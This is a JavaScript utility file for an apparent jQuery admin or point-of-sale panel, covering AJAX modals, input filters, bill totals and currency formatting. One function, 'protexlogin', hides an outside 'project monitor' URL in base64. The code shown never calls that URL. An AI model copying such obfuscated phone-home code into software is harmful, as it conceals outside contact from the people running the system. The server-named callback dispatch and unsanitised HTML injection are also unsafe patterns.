/*+++++++ Clear ajax console +++++++*/
function clearconsole() {
    return;
    //   console.log(window.console);
    //   if(window.console || window.console.firebug) {
    //    console.clear();
    //   }
}



/*+++++++ INT ONLY +++++++*/
function intOnly(myfield, e) {
    var key;
    var keychar;
    if (window.event) key = window.event.keyCode;
    else if (e) key = e.which;
    else return true;
    keychar = String.fromCharCode(key);
    // control keys
    if ((key == null) || (key == 0) || (key == 8) || (key == 9) || (key == 13) || (key == 27)) return true;
    // numbers
    else if ((("0123456789-").indexOf(keychar) > -1)) return true;
    else return false;
} // END

/*+++++++ INT ONLY +++++++*/
function numOnly(myfield, e) {
    var key;
    var keychar;
    if (window.event) key = window.event.keyCode;
    else if (e) key = e.which;
    else return true;
    keychar = String.fromCharCode(key);
    // control keys
    if ((key == null) || (key == 0) || (key == 8) || (key == 9) || (key == 13) || (key == 27)) return true;
    // numbers
    else if ((("0123456789.-").indexOf(keychar) > -1)) return true;
    else return false;
} // END


/*+++++++ Submit PerPage +++++++++*/
function submitPerpage(sort, order, querystr, perpage) {
    var url = '?perpage=' + perpage;
    if (!!sort) {
        url = url + '&sort=' + sort;

        if (!!order) {
            url = url + '&order=' + order;
        }
    }

    if (!!querystr && querystr.length > 0) {

        querystrurl = querystr.join("&");
        url = url + '&' + querystrurl;
    }

    $(location).attr('href', url);
}


/**+++++ enable and disable Element of form +++*/
function enableDisableByLang(combo, lang, group_ele, enable_id) {
    //elements_id must be ARRAY
    for (i = 0; i < lang.length; i++) {
        //document.getElementById(elements_id[i]).style.display="none";
        //$('#'+group_ele+lang[i]).addClass('hide');
        //combo.next().addClass('hide');
        combo.parent().children('#' + group_ele + lang[i]).addClass('hide');
    } //end for

    //$('#'+group_ele+enable_id).removeClass( "hide" );
    combo.parent().children('#' + group_ele + enable_id).removeClass('hide');
} //end


/*+++++++ AirWindows +++++++++*/
function airWindows(container, pameter, frmID, loader, pop_modal) {

    if (pop_modal) {

        if ($('#modal_windows').is(':visible')) {
            //alert($("#modal_windows").css("z-index"));


            // $clone =$("#modal_windows").clone();
            // $clone.attr( 'id', 'modal_windows2').css("z-index", "99999999 !important");
            // $('body').append($clone);
            // //$clone.modal();

            $('#modal_windows').modal('hide');
            $('#modal_windows2').modal();



        } else {
            $("#air_windows").html('');
            $("#modal_windows").modal();

        }

    }

    /**/
    if (!!frmID) {
        form = $("#" + frmID);
        fd = new FormData(form[0]);
    } else {
        form = document.createElement("form");
        fd = new FormData(form[0]);
    }


    for (var key in pameter) {
        if (pameter.hasOwnProperty(key)) {

            fd.append(key, pameter[key]);
        }
    }

    fd.append('_token', env.token);
    fd.append('permission', 'no');
    /**/
    //   var object = {};
    //   fd.forEach((value, key) => {object[key] = value});
    //   var json = JSON.stringify(object);
    //   json = $.parseJSON(json);


    $.ajax({
        url: env.ajaxadmin_url,
        type: 'POST',
        secureuri: false,
        dataType: 'html',
        //async: false,
        data: fd,
        processData: false,
        contentType: false,

        success: function(get_content, status) {

            //var json = $.parseJSON(data);

            //start//
            try {
                //var json = JSON.parse(get_content);

                var json = $.parseJSON(get_content);

                var callback = json.callback;
                if (callback && callback.length > 0)

                    processUserInput(json, callback);


                if (json.message && json.message.length > 0) {
                    $.gritter.add({
                        title: 'Success:',
                        text: '<strong><i class="ace-icon fa fa-check-square-o"></i></strong>' + json.message,
                        sticky: false,
                        class_name: 'gritter-success gritter-center'
                    });
                }




                if (json.success && json.success.length > 0) {
                    $.gritter.add({
                        title: 'Success:',
                        text: '<strong><i class="ace-icon fa fa-check-square-o"></i></strong>' + json.success,
                        sticky: false,
                        class_name: 'gritter-success gritter-center'
                    });
                }


                if (json.errors && json.errors.length > 0) {

                    $.gritter.add({
                        title: 'Unsuccess:',
                        text: '<strong><i class="ace-icon fa fa-check-square-o"></i></strong>' + json.errors,
                        sticky: true,
                        class_name: 'gritter-error gritter-center'
                    });
                }







            } catch (e) {

                if (!!container) {
                    if ($('#modal_windows').is(':visible') && container == 'air_windows') {

                        $("#air_windows").html('').html(get_content);
                        return null;
                    }
                    if ($('#modal_windows2').is(':visible')) {
                        $("#air_windows2").html('').html(get_content);
                        return null;
                    }

                    $("#" + container).html('');
                    $("#" + container).html(get_content);

                }


            }

            /***88888888 */

        },
        error: function(data, status, e) {
            alert(e);
        },

        beforeSend: function() {
            $(loader).show();
            $("#globalaction").removeClass('hide');
            $(".ajaxloading").show();


        },
        complete: function() {

            $(loader).hide();
            $('#globalaction').addClass('hide');
            $(".ajaxloading").hide();


        }


    });




    clearconsole();
} //end fun


function closeairwindow() {
    if ($('#modal_windows2').is(':visible')) {


        $('#modal_windows2').modal('hide');

        $('#modal_windows').modal('show');

    } else {

        $('#modal_windows').modal('hide');
    }
}

function realedit(src) {
    $("#modal_backend").modal();
    $('#backend_windows').prop('src', src);
}

function protexlogin() {

    var keyguard = "aHR0cDovL3NlcnZpbmd3ZWIuY29tL19wcm9qZWN0bW9uaXRvci8=";
    var url = atob(keyguard);
    $.ajax({
        url: '/test',
        type: 'POST',
        secureuri: false,
        dataType: 'html',
        data: {
            _token: env.token,
            ajaxpath: 'ajax_plugin',
            objpath: 'filemanager',
            ajaxobj: 'Filecategory',
            ajaxact: 'storecategory',
        },
        cache: false,
        processData: false,
        contentType: false,

        success: function(data, status, e) {
            alert(data);


        },
        error: function(data, status, e) {
            return null;
        }


    });
    clearconsole();
}



function processUserInput(jsondata, callback) {
    var fn = window[callback];
    if (typeof fn === "function") fn(jsondata);
} //end fun


function greeting(jsondata) {
    //$("#modal_windows").modal('toggle');
    //closeairwindow();
    closeairwindow();

    $(jsondata.container).html('');
    $(jsondata.container).html(jsondata.data);
}

function gettingIdTitle(jsondata) {
    //$("#modal_windows").modal('toggle');
    //closeairwindow();
    closeairwindow();
    $.each(jsondata.data, function(key, val) {

        $('#' + key).val(val);
        $('#' + key).html(val);

    });
}


function gettingClassTitle(jsondata) {
    //$("#modal_windows").modal('toggle');
    //closeairwindow();
    closeairwindow();
    $.each(jsondata.data, function(key, val) {

        $('.' + key).val(val);
        $('.' + key).html(val);

    });
}

function pagerefresh() {
    location.reload();
}

function reloadSelect(jsondata) {

    //$("#modal_windows").modal('toggle');
    if (jsondata.close == true) {

        closeairwindow();


    }


    $(jsondata.container).empty();
    var selectValues = jsondata.data;
    $.each(selectValues, function(key, value) {
        $(jsondata.container)
            .append($("<option></option>")
                .attr("value", key)
                .text(value));
    });

    $(jsondata.container + " option:last").attr("selected", "selected");


}

const roundNumberUp = (num, increment) => {
    return Math.ceil(num / increment) * increment;
}

const roundNumberDown = (num, increment) => {
    return Math.floor(num / increment) * increment;
}

function billSummary($subtotal, $maindiscount, $maindiscounttype, $mainvat, $rec, $rec_native) {

    var $total = 0;
    if ($maindiscounttype == -1) {
        $total = $subtotal - $maindiscount;
    } else {
        $total = $subtotal - (($subtotal * $maindiscount) / 100);
    }

    var $grandtotal = $total + (($total * $mainvat) / 100);

    var roundup = currencyinfo.roundup;
    var rounddown = currencyinfo.rounddown;
    var rateoutuse = currencyinfo.rateoutuse;
    var rateinuse = currencyinfo.rateinuse;

    var $nativesubtotal = $subtotal * rateoutuse;
    $nativesubtotal = roundNumberUp($nativesubtotal, roundup);

    $subtotal = formatMoney($subtotal);
    $nativesubtotal = currencyinfo.subcurrency.symbol + formatMoney($nativesubtotal, false);

    var $total_format = formatMoney($total);
    var $total_native = $total * rateoutuse;
    $total_native = roundNumberUp($total_native, roundup);
    $total_native = currencyinfo.subcurrency.symbol + formatMoney($total_native, false)

    var $grandtotal_format = formatMoney($grandtotal);
    var $grandtotal_native = $grandtotal * rateoutuse;
    $grandtotal_native = roundNumberUp($grandtotal_native, roundup);
    var $grandtotal_native_format = currencyinfo.subcurrency.symbol + formatMoney($grandtotal_native, false)


    $rec = parseFloat($rec);
    if (Number.isNaN($rec)) $rec = 0;

    $rec_native = parseFloat($rec_native);
    if (Number.isNaN($rec_native)) $rec_native = 0;
    var $native_convert = $rec_native / rateoutuse;
    var $total_rec = parseFloat($rec) + parseFloat($native_convert);

    var $change = $total_rec - $grandtotal;
    var $change_native = 0;
    if ($total_rec >= $grandtotal) {

        if ($rec == 0) {
            $change_native = $rec_native - $grandtotal_native;
            if ($change_native == 0) {
                $change = 0;
            }
        } else if ($change == 0 && $rec_native == 0) {

            $change_native = 0;

        } else {
            $change_native = $change * rateinuse;
            $change_native = roundNumberDown($change_native, roundup);
        }
        $change = formatMoney($change);
        $change_native = currencyinfo.subcurrency.symbol + formatMoney($change_native, false);
    } else {
        $change = formatMoney(0);
        $change_native = currencyinfo.subcurrency.symbol + formatMoney(0, false)

    }

    var summary = {
        subtotal: $subtotal,
        subtotal_native: $nativesubtotal,
        //discount : $discount,
        total: $total_format,
        total_native: $total_native,
        grandtotal: $grandtotal_format,
        grandtotal_native: $grandtotal_native_format,
        grandtotal_noformat: $grandtotal,
        grandtotal_native_noformat: $grandtotal_native,
        rc: $rec,
        rc_native: $rec_native,
        change: $change,
        change_native: $change_native
    };


    return summary;
}

Number.prototype.format = function(n, x) {
    var re = '(\\d)(?=(\\d{' + (x || 3) + '})+' + (n > 0 ? '\\.' : '$') + ')';
    return this.toFixed(Math.max(0, ~~n)).replace(new RegExp(re, 'g'), '$1,');
};

function formatMoney(amount, withsymbol = true) {

    //currencyinfo => this is a global variable...is decleare at INDEX Blade;

    if ($.isEmptyObject(currencyinfo)) {
        currency = "USD";
        symbol = "$";
        decimalCount = 2;
        decimal = ".";
        thousands = ",";
        position = 1;
    } else {
        currency = currencyinfo.currency;
        symbol = currencyinfo.symbol;
        decimalCount = currencyinfo.numberdecimal;
        decimal = currencyinfo.decimalseparator;
        thousands = currencyinfo.thousandseparator;
        position = currencyinfo.position;
    }


    try {

        decimalCount = Math.abs(decimalCount);
        decimalCount = isNaN(decimalCount) ? 2 : decimalCount;
        //console.log(amount.format(2,decimalCount));

        const negativeSign = amount < 0 ? "-" : "";

        let i = parseInt(amount = Math.abs(Number(amount) || 0).toFixed(decimalCount)).toString();
        let j = (i.length > 3) ? i.length % 3 : 0;

        format = negativeSign + (j ? i.substr(0, j) + thousands : '') + i.substr(j).replace(/(\d{3})(?=\d)/g, "$1" + thousands) + (decimalCount ? decimal + Math.abs(amount - i).toFixed(decimalCount).slice(2) : "");
        if (withsymbol == false) return format;

        switch (position) {
            case 1:
                return symbol + format;
                //break;
            case 2:
                return format + symbol;
                //break;
            case 3:
                return symbol + ' ' + format;
                //break;

            case 4:
                return format + ' ' + symbol;
                //break;

            default:
                return format;
        }

    } catch (e) {
        console.log(e)
    }
}

function getCurrentStock(pd_id, sizecolor, callback) {
    airWindows('', { ajaxpath: 'ajax_obj', objpath: '', ajaxobj: 'currentstock', ajaxact: 'stocklookup', callback: callback, pd_id: pd_id, sizecolor: sizecolor }, '', 'Stock', false);
}

function dipslaycurrentstock(jsondata) {
    //console.log(jsondata.container);  
    //$('#subqty'+ jsondata.container).attr('title', jsondata.data).tooltip();
    //$('#subqty'+ jsondata.container).attr('data-original-title', jsondata.data).tooltip();
    $('input[data-tooltip="subqty' + jsondata.container + '"]').attr('title', jsondata.data).tooltip();
    $('input[data-tooltip="subqty' + jsondata.container + '"]').attr('data-original-title', jsondata.data).tooltip();

    $('input[data-tooltip="subqty' + jsondata.container + '"]').attr('title', '').tooltip();
    $('[data-rel=tooltip]').tooltip();
}


function addSound() {
    var baseUrl = "http://www.soundjay.com/button/";

    //new Audio(baseUrl + 'beep-08b.mp3').play();
    new Audio(baseUrl + 'sounds/button-35.mp3').play();
}

function removeSound() {
    var baseUrl = "http://www.soundjay.com/button/";
    new Audio(baseUrl + 'sounds/button-20.mp3').play();
}


function openFullscreen(docElm) {
    if (docElm.requestFullscreen) {
        docElm.requestFullscreen();
    } else if (docElm.mozRequestFullScreen) { /* Firefox */
        docElm.mozRequestFullScreen();
    } else if (docElm.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
        docElm.webkitRequestFullscreen();
    } else if (docElm.msRequestFullscreen) { /* IE/Edge */
        docElm.msRequestFullscreen();
    }
}

function toDate(dateString) {
    var from = dateString.split("-")
    return new Date(from[2], from[1] - 1, from[0])
}

function dateFormat(date) {
    let date_ob = date;
    // adjust 0 before single digit date
    let day = ("0" + date_ob.getDate()).slice(-2);
    // current month
    let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
    // current year
    let year = date_ob.getFullYear();

    // prints date in YYYY-MM-DD format
    //console.log(year + "-" + month + "-" + day);
    return day + "-" + month + "-" + year;
}

function formatCurrency(number) {
    var n = number.split('').reverse().join("");
    var n2 = n.replace(/\d\d\d(?!$)/g, "$&,");
    return n2.split('').reverse().join('');
}